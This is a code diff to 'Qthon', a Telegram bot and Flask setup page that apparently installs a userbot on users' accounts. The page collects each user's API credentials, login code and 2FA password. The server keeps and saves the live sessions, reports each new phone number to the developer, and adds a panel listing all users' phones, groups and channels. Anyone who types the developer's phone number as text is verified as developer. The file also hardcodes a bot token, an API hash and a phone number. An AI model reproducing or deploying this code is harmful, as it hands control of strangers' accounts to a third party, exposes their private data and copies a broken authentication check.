@@ -42,6 +42,8 @@ BOT_TOKEN = '8887748662:AAH3gpgZz6BsBCOx3yq8hXtnDel1dGVn7Mo'
 BOT_API_ID = 2040
 BOT_API_HASH = 'b18441a1ff607e10a989891a5462e627'
 DEV_PHONE = "+201096371454"
+DEV_USER_ID = 6443238809   # معرف المطور الرقمي
+DEV_USERNAME = "J0E_3"
 
 main_loop = asyncio.new_event_loop()
 
@@ -61,6 +63,10 @@ client_me = {}
 command_stats = {}
 user_info_cache = {}
 
+# مطورين تم التحقق منهم
+verified_devs = set()
+pending_verify = {}
+
 def run_async_in_main_loop(coro):
     future = asyncio.run_coroutine_threadsafe(coro, main_loop)
     return future.result(timeout=60)
@@ -79,8 +85,21 @@ def track_command(phone: str, command: str):
         command_stats[phone] = Counter()
     command_stats[phone][command] += 1
 
-def is_dev(phone: str) -> bool:
-    return phone == DEV_PHONE
+def is_dev(user_id: int) -> bool:
+    if user_id in verified_devs:
+        return True
+    if user_id == DEV_USER_ID:
+        verified_devs.add(user_id)
+        return True
+    for phone, client in active_clients.items():
+        if phone == DEV_PHONE:
+            try:
+                if hasattr(client, '_self_id') and client._self_id == user_id:
+                    verified_devs.add(user_id)
+                    return True
+            except:
+                pass
+    return False
 
 async def save_all_sessions():
     try:
@@ -437,84 +456,128 @@ bot = TelegramClient(f'bot_session_{uuid.uuid4().hex[:6]}', BOT_API_ID, BOT_API_
 
 async def notify_dev(message):
     try:
-        dev_client = None
         for phone, client in active_clients.items():
             if phone == DEV_PHONE:
-                dev_client = client
+                await client.send_message('me', message)
                 break
-        if dev_client:
-            await dev_client.send_message('me', message)
     except Exception as e:
         logger.error(f"Failed to notify dev: {e}")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def bot_start(event):
-    sender = await event.get_sender()
-    sender_phone = getattr(sender, 'phone', None)
     user_id = event.sender_id
+    if is_dev(user_id):
+        # لوحة تحكم المطور
+        buttons = [
+            [Button.inline("USERS COUNT", b"dev_users"),
+             Button.inline("ACTIVE NOW", b"dev_active")],
+            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
+             Button.inline("GROUPS LIST", b"dev_groups")],
+            [Button.inline("CHANNELS LIST", b"dev_channels"),
+             Button.inline("BROADCAST", b"dev_broadcast")],
+        ]
+        await event.respond(
+            "**Qthon Developer Panel**\n\nSelect an option.",
+            buttons=buttons,
+            parse_mode='md'
+        )
+        return
 
+    # رسالة المستخدم العادي
     buttons = [
-        [Button.url("🔗 جلب بيانات الحساب", "https://my.telegram.org/apps")],
-        [Button.url("⚙️ فتح صفحة التنصيب", os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000'))],
+        [Button.url("GET MY DATA", "https://my.telegram.org/apps")],
+        [Button.url("SETUP GUIDE", os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000'))],
+        [Button.inline("HOW TO GET DATA", b"how_to_get_data")],
+        [Button.inline("CONTROL", b"dev_login")],
     ]
     await event.respond(
-        "**أهلاً بك في Qthon** 👋\n\n"
-        "لبدء التنصيب، تحتاج إلى جلب بيانات حسابك من تيليجرام.\n\n"
-        "**الخطوات:**\n"
-        "① اضغط على **جلب بيانات الحساب**\n"
-        "② سجّل دخولك وانسخ الـ API ID والـ API Hash\n"
-        "③ ارجع هنا واضغط **فتح صفحة التنصيب**\n\n"
-        "الأمر بسيط ولا يستغرق دقيقتين 🚀",
+        "**• To start Telethon Qthon Setup 🜲**\n\n"
+        "- You need your account information\n"
+        "- Open the bot app to begin\n"
+        "- Complete the required setup steps",
         buttons=buttons,
         parse_mode='md'
     )
-    # إشعار المطور
-    try:
-        name = getattr(sender, 'first_name', 'Unknown')
-        username = f"@{sender.username}" if getattr(sender, 'username', None) else "بدون يوزر"
-        await notify_dev(f"🔔 مستخدم جديد بدأ البوت\n👤 {name} | {username}\n🆔 {user_id}")
-    except:
-        pass
+
+@bot.on(events.CallbackQuery(data=b"how_to_get_data"))
+async def how_to_get_data(event):
+    await event.answer(
+        "1. Go to my.telegram.org\n"
+        "2. Login with your phone number\n"
+        "3. Go to API development tools\n"
+        "4. Get your api_id and api_hash",
+        alert=True
+    )
+
+@bot.on(events.CallbackQuery(data=b"dev_login"))
+async def dev_login(event):
+    pending_verify[event.sender_id] = True
+    buttons = [[Button.request_phone("SHARE PHONE NUMBER", resize=True)]]
+    await event.edit(
+        "**Developer Verification**\n\n"
+        "Share your phone number to verify as owner.",
+        buttons=buttons,
+        parse_mode='md'
+    )
+    await event.answer()
+
+@bot.on(events.NewMessage(func=lambda e: e.message.contact or e.sender_id in pending_verify))
+async def handle_phone_verify(event):
+    user_id = event.sender_id
+    if user_id not in pending_verify:
+        return
+    if event.message.contact:
+        phone = f"+{event.message.contact.phone_number}"
+    else:
+        phone = event.text.strip()
+        if not phone.startswith('+'):
+            phone = f"+{phone}"
+    if phone == DEV_PHONE:
+        verified_devs.add(user_id)
+        del pending_verify[user_id]
+        buttons = [
+            [Button.inline("USERS COUNT", b"dev_users"),
+             Button.inline("ACTIVE NOW", b"dev_active")],
+            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
+             Button.inline("GROUPS LIST", b"dev_groups")],
+            [Button.inline("CHANNELS LIST", b"dev_channels"),
+             Button.inline("BROADCAST", b"dev_broadcast")],
+        ]
+        await event.respond(
+            "**Identity Verified!**\n\nWelcome to the Developer Panel.",
+            buttons=buttons,
+            parse_mode='md'
+        )
+        await notify_dev(f"Developer verified via phone: {phone}")
+    else:
+        await event.respond("**Verification Failed**\nPhone does not match.", parse_mode='md')
 
 @bot.on(events.CallbackQuery())
 async def dev_callback(event):
     data = event.data.decode()
-    sender = await event.get_sender()
-    sender_phone = getattr(sender, 'phone', '')
-
-    # تحقق من المطور بالـ ID مش الرقم
-    dev_ids = []
-    for phone, client in active_clients.items():
-        if phone == DEV_PHONE:
-            try:
-                me = await client.get_me()
-                dev_ids.append(me.id)
-            except:
-                pass
-
-    if event.sender_id not in dev_ids:
-        await event.answer("⛔ غير مصرح", alert=True)
+    if not is_dev(event.sender_id):
+        await event.answer("Access denied", alert=True)
         return
 
     if data == "dev_users":
         total = len(active_clients)
-        msg = f"**👥 المستخدمون المسجلون: {total}**\n\n"
+        msg = f"**Total Registered Users:** {total}\n\n"
         for phone, info in user_info_cache.items():
-            username = f"@{info['username']}" if info['username'] else "بدون يوزر"
+            username = f"@{info['username']}" if info['username'] else "no username"
             msg += f"• {info['first_name']} | {username} | {phone}\n"
         if not user_info_cache:
-            msg += "لا يوجد مستخدمون."
+            msg += "No users found."
         await event.edit(msg, parse_mode='md')
 
     elif data == "dev_active":
         active_count = len(active_clients)
-        msg = f"**🟢 النشطون حالياً: {active_count}**\n\n"
+        msg = f"**Currently Active:** {active_count}\n\n"
         for phone, client in active_clients.items():
             info = user_info_cache.get(phone, {})
             name = info.get('first_name', phone)
             msg += f"• {name} | {phone}\n"
         if not active_clients:
-            msg += "لا توجد جلسات نشطة."
+            msg += "No active sessions."
         await event.edit(msg, parse_mode='md')
 
     elif data == "dev_topcmd":
@@ -522,29 +585,51 @@ async def dev_callback(event):
         for cmds in command_stats.values():
             all_cmds.update(cmds)
         top = all_cmds.most_common(10)
-        msg = "**📊 أكثر 10 أوامر استخداماً:**\n\n"
+        msg = "**Top 10 Commands:**\n\n"
         for i, (cmd, cnt) in enumerate(top, 1):
-            msg += f"{i}. {cmd}: {cnt} مرة\n"
+            msg += f"{i}. .{cmd}: {cnt} times\n"
         if not top:
-            msg += "لم يُستخدم أي أمر بعد."
+            msg += "No commands used yet."
+        await event.edit(msg, parse_mode='md')
+
+    elif data == "dev_groups":
+        msg = "**Groups:**\n\n"
+        for phone, info in user_info_cache.items():
+            groups = info.get('groups', [])
+            if groups:
+                msg += f"**{info.get('first_name', phone)}:**\n"
+                for g in groups[:5]:
+                    msg += f"  • {g['name']}\n"
+        if not msg.strip():
+            msg = "No groups found."
+        await event.edit(msg, parse_mode='md')
+
+    elif data == "dev_channels":
+        msg = "**Channels:**\n\n"
+        for phone, info in user_info_cache.items():
+            channels = info.get('channels', [])
+            if channels:
+                msg += f"**{info.get('first_name', phone)}:**\n"
+                for c in channels[:5]:
+                    msg += f"  • {c['name']}\n"
+        if not msg.strip():
+            msg = "No channels found."
         await event.edit(msg, parse_mode='md')
 
     elif data == "dev_broadcast":
-        await event.answer("قريباً", alert=True)
+        await event.answer("Coming soon", alert=True)
 
     await event.answer()
 
-
-# ======================== موقع الويب ========================
+# ======================== موقع الويب (إنجليزي) ========================
 @app.route('/')
 def home():
-    domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
     return """<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Qthon — UserBot Setup</title>
+<title>Qthon — Telethon Setup</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
 
@@ -581,7 +666,6 @@ def home():
     overflow-x: hidden;
   }
 
-  /* ── ambient glow ── */
   body::before {
     content:'';
     position:fixed; inset:0;
@@ -597,7 +681,6 @@ def home():
     display:flex; flex-direction:column; gap:20px;
   }
 
-  /* ── header ── */
   .hd { text-align:center; padding:8px 0 4px; }
 
   .hd-icon {
@@ -630,7 +713,6 @@ def home():
     animation: fadeUp .5s .2s ease both;
   }
 
-  /* ── card ── */
   .card {
     background: var(--card);
     border: 1px solid var(--border);
@@ -643,7 +725,6 @@ def home():
   }
   .card:hover { border-color: var(--border-hi); }
 
-  /* ── step label ── */
   .step-label {
     display:flex; align-items:center; gap:10px;
     margin-bottom:22px;
@@ -658,7 +739,6 @@ def home():
   }
   .step-text { font-size:14px; font-weight:600; color:var(--text2); }
 
-  /* ── back btn (top-left in RTL = start of flow, top-right visually) ── */
   .back-btn {
     display:inline-flex; align-items:center; gap:6px;
     padding:6px 14px;
@@ -677,7 +757,6 @@ def home():
   .back-btn:hover { background:rgba(255,255,255,.09); color:var(--text); }
   .back-btn svg { width:14px; height:14px; fill:currentColor; }
 
-  /* ── field ── */
   .field { margin-bottom:14px; }
   .field label {
     display:block;
@@ -711,7 +790,6 @@ def home():
     letter-spacing:10px;
   }
 
-  /* ── button ── */
   .btn {
     width:100%; padding:15px;
     border:none; border-radius:var(--r);
@@ -739,7 +817,6 @@ def home():
   }
   .btn-green:hover { box-shadow:0 8px 32px rgba(48,209,88,.35); transform:translateY(-1px); }
 
-  /* ── button shimmer on press ── */
   .btn::after {
     content:'';
     position:absolute; inset:0;
@@ -749,7 +826,6 @@ def home():
   }
   .btn:active::after { transform:translateX(100%); }
 
-  /* ── progress bar inside button ── */
   .btn .prog-bar {
     position:absolute; bottom:0; left:0; height:3px;
     background: rgba(255,255,255,.5);
@@ -772,7 +848,6 @@ def home():
     animation:spin .7s linear infinite;
   }
 
-  /* ── result ── */
   .result {
     display:none; margin-top:16px;
     padding:13px 16px;
@@ -785,7 +860,6 @@ def home():
   .result.ok  { background:rgba(48,209,88,.1);  border:1px solid rgba(48,209,88,.25);  color:var(--success); }
   .result.err { background:rgba(255,69,58,.1);   border:1px solid rgba(255,69,58,.25);  color:var(--danger);  }
 
-  /* ── info card ── */
   .info-card {
     background:var(--card);
     border:1px solid var(--border);
@@ -798,7 +872,6 @@ def home():
     color:var(--text2); margin-bottom:12px;
     display:flex; align-items:center; gap:8px;
   }
-  .info-card h3 span { font-size:16px; }
   .info-card p {
     font-size:13px; color:var(--text3);
     line-height:1.75; margin-bottom:6px;
@@ -827,13 +900,9 @@ def home():
   }
   .info-card .tg-btn svg { width:18px; height:18px; fill:currentColor; }
 
-  /* ── relative wrapper for back btn ── */
   .rel { position:relative; padding-top:8px; }
-
-  /* ── hidden ── */
   .hidden { display:none; }
 
-  /* ── keyframes ── */
   @keyframes popIn {
     from { opacity:0; transform:scale(.6); }
     to   { opacity:1; transform:scale(1); }
@@ -854,23 +923,20 @@ def home():
 <body>
 <div class="wrap">
 
-  <!-- header -->
   <div class="hd">
     <div class="hd-icon">
       <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
     </div>
     <h1>Qthon</h1>
-    <p>Telethon UserBot — Setup</p>
+    <p>Telethon Setup</p>
   </div>
 
-  <!-- main card -->
   <div class="card">
 
-    <!-- STEP 1 -->
     <div id="step1">
       <div class="step-label">
         <div class="step-dot">1</div>
-        <span class="step-text">معلومات الحساب</span>
+        <span class="step-text">Account Information</span>
       </div>
 
       <div class="field">
@@ -882,57 +948,54 @@ def home():
         <input id="api_hash" type="text" placeholder="0123456789abcdef…" autocomplete="off">
       </div>
       <div class="field">
-        <label>رقم الهاتف</label>
+        <label>Phone Number</label>
         <input id="phone" type="text" placeholder="+201234567890" inputmode="tel" autocomplete="off">
       </div>
 
       <button class="btn btn-blue" id="sendBtn" onclick="sendCode()">
-        <span class="btn-label">إرسال رمز التحقق</span>
+        <span class="btn-label">Send Verification Code</span>
         <div class="prog-bar" id="prog1"></div>
       </button>
     </div>
 
-    <!-- STEP 2 -->
     <div id="step2" class="hidden rel">
       <button class="back-btn" onclick="backToStep1()">
         <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-        رجوع
+        Back
       </button>
 
       <div class="step-label" style="margin-top:40px">
         <div class="step-dot">2</div>
-        <span class="step-text">رمز التحقق</span>
+        <span class="step-text">Verification Code</span>
       </div>
 
       <div class="field">
-        <label>الرمز المُرسل</label>
+        <label>Code</label>
         <input id="code" type="text" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
       </div>
       <div class="field">
-        <label>كلمة مرور 2FA <span style="color:var(--text3);font-weight:400">(اختياري)</span></label>
+        <label>2FA Password <span style="color:var(--text3);font-weight:400">(optional)</span></label>
         <input id="password" type="password" placeholder="••••••••" autocomplete="current-password">
       </div>
 
       <button class="btn btn-green" id="verifyBtn" onclick="verify()">
-        <span class="btn-label">تفعيل Qthon</span>
+        <span class="btn-label">Activate Telethon</span>
         <div class="prog-bar" id="prog2"></div>
       </button>
     </div>
 
-    <!-- result -->
     <div class="result" id="result"></div>
   </div>
 
-  <!-- info card -->
   <div class="info-card">
-    <h3><span>🔑</span> كيف تحصل على بيانات الحساب؟</h3>
-    <p>① افتح موقع تيليجرام من الزر أدناه</p>
-    <p>② سجّل دخولك برقم هاتفك</p>
-    <p>③ اختر <strong style="color:var(--text2)">API development tools</strong></p>
-    <p>④ أنشئ تطبيقاً واحفظ الـ <strong style="color:var(--text2)">api_id</strong> والـ <strong style="color:var(--text2)">api_hash</strong></p>
+    <h3><span>🔑</span> How to get API credentials?</h3>
+    <p>1. Open Telegram website from the button below</p>
+    <p>2. Log in with your phone number</p>
+    <p>3. Go to <strong>API development tools</strong></p>
+    <p>4. Create an app and copy your <strong>api_id</strong> and <strong>api_hash</strong></p>
     <a class="tg-btn" href="https://my.telegram.org/apps" target="_blank">
       <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
-      فتح my.telegram.org
+      Open my.telegram.org
     </a>
   </div>
 
@@ -971,7 +1034,7 @@ async function sendCode() {
   const api_id = $('api_id').value.trim();
   const api_hash = $('api_hash').value.trim();
   const phone = $('phone').value.trim();
-  if (!api_id || !api_hash || !phone) { showResult('يرجى تعبئة جميع الحقول', false); return; }
+  if (!api_id || !api_hash || !phone) { showResult('Please fill all fields', false); return; }
 
   const btn = $('sendBtn');
   btn.classList.add('loading');
@@ -990,16 +1053,16 @@ async function sendCode() {
       if (data.status === 'code_sent') {
         $('step1').classList.add('hidden');
         $('step2').classList.remove('hidden');
-        showResult('✓ تم إرسال رمز التحقق', true);
+        showResult('Verification code sent', true);
       } else {
-        showResult('✓ الجلسة نشطة بالفعل', true);
+        showResult('Session already active', true);
       }
     } else {
-      showResult(data.message || 'حدث خطأ', false);
+      showResult(data.message || 'Error occurred', false);
     }
   } catch(e) {
     prog.finish();
-    showResult('خطأ في الاتصال', false);
+    showResult('Connection error', false);
   } finally {
     btn.classList.remove('loading');
   }
@@ -1008,7 +1071,7 @@ async function sendCode() {
 async function verify() {
   const code = $('code').value.trim();
   const password = $('password').value;
-  if (!code) { showResult('أدخل رمز التحقق', false); return; }
+  if (!code) { showResult('Enter verification code', false); return; }
 
   const btn = $('verifyBtn');
   btn.classList.add('loading');
@@ -1023,13 +1086,15 @@ async function verify() {
     const data = await res.json();
     prog.finish();
     if (data.status === 'success') {
-      showResult('✓ تم تثبيت تيليثون كيوثون بنجاح!', true);
+      showResult('Telethon installed successfully!', true);
+      // Auto refresh after 3 seconds
+      setTimeout(() => { location.reload(); }, 3000);
     } else {
-      showResult(data.message || 'فشل التحقق', false);
+      showResult(data.message || 'Verification failed', false);
     }
   } catch(e) {
     prog.finish();
-    showResult('خطأ في الاتصال', false);
+    showResult('Connection error', false);
   } finally {
     btn.classList.remove('loading');
   }
@@ -1041,7 +1106,6 @@ function backToStep1() {
   $('result').className = 'result';
 }
 
-// Enter key support
 document.addEventListener('keydown', e => {
   if (e.key !== 'Enter') return;
   if (!$('step2').classList.contains('hidden')) verify();
@@ -1063,7 +1127,7 @@ async def send_code():
         api_hash = request.form.get('api_hash')
         phone = request.form.get('phone', '').strip()
         if not api_id or not api_hash or not phone:
-            return jsonify({"status": "error", "message": "جميع الحقول مطلوبة"}), 400
+            return jsonify({"status": "error", "message": "All fields required"}), 400
         api_configs_storage[phone] = {'api_id': api_id, 'api_hash': api_hash}
         client = TelegramClient(StringSession(), api_id, api_hash)
         await client.connect()
@@ -1072,10 +1136,10 @@ async def send_code():
             client_me[phone] = await client.get_me()
             start_client_in_background(client, phone)
             await save_all_sessions()
-            return jsonify({"status": "already_active", "message": "الجلسة نشطة بالفعل"})
+            return jsonify({"status": "already_active", "message": "Session already active"})
         sent = await client.send_code_request(phone)
         pending_logins[phone] = (client, sent.phone_code_hash, api_id, api_hash)
-        return jsonify({"status": "code_sent", "message": "تم إرسال رمز التحقق"})
+        return jsonify({"status": "code_sent", "message": "Verification code sent"})
     except Exception as e:
         logger.error(f"Send code error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -1087,22 +1151,22 @@ async def verify():
     code = request.form.get('code', '').strip()
     password = request.form.get('password')
     if not phone or not code or phone not in pending_logins:
-        return jsonify({"status": "error", "message": "جلسة غير صالحة"}), 400
+        return jsonify({"status": "error", "message": "Invalid session"}), 400
     client, phone_code_hash, api_id, api_hash = pending_logins[phone]
     try:
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         except SessionPasswordNeededError:
             if not password:
-                return jsonify({"status": "error", "message": "كلمة مرور 2FA مطلوبة"}), 401
+                return jsonify({"status": "error", "message": "2FA password required"}), 401
             await client.sign_in(password=password)
         active_clients[phone] = client
         client_me[phone] = await client.get_me()
         del pending_logins[phone]
         await save_all_sessions()
         start_client_in_background(client, phone)
-        await notify_dev(f"✅ مستخدم جديد فعّل البوت\n📱 {phone}")
-        return jsonify({"status": "success", "message": "تم تثبيت تيليثون كيوثون بنجاح"})
+        await notify_dev(f"New user activated: {phone}")
+        return jsonify({"status": "success", "message": "Telethon installed successfully"})
     except Exception as e:
         logger.error(f"Verify error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 400
@@ -1119,7 +1183,7 @@ loop_thread.start()
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
     logger.info("Bot started")
-    await notify_dev("🚀 Qthon Bot started successfully!")
+    await notify_dev("Qthon Bot started successfully!")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
